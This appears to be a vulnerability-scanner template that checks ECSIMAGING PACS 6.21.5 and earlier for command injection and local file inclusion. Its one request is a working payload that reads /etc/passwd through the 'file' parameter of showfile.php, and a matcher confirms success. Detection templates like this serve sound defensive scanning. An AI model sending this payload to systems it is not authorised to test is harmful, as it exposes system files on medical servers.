id: ecsimagingpacs-rce
info:
  name: ECSIMAGING PACS <= 6.21.5 - Command Execution and Local File Inclusion
  author: ritikchaddha
  severity: critical
  description: The ECSIMAGING PACS version 6.21.5 and below are vulnerable to command
    injection and local file inclusion through the 'file' parameter, with potential
    escalation of privileges due to www-data user having sudo NOPASSWD access.
  reference: https://www.exploit-db.com/exploits/49388
  metadata:
    verified: false
    impact: The command execution and local file inclusion vulnerabilities in ECSIMAGING
      PACS version 6.21.5 and below, with www-data user having sudo NOPASSWD access,
      can have a significant impact on the security and confidentiality of the system.
    recommendation: It is recommended to update ECSIMAGING PACS to a version above
      6.21.5 to address the vulnerabilities and remove sudo NOPASSWD access for the
      www-data user.
  tags: ecsimagingpacs,rce
  classification:
    cwe-id: CWE-78
requests:
- method: GET
  path:
  - '{{BaseURL}}/showfile.php?file=/etc/passwd'
  matchers-condition: and
  matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
  - type: status
    status:
    - 200
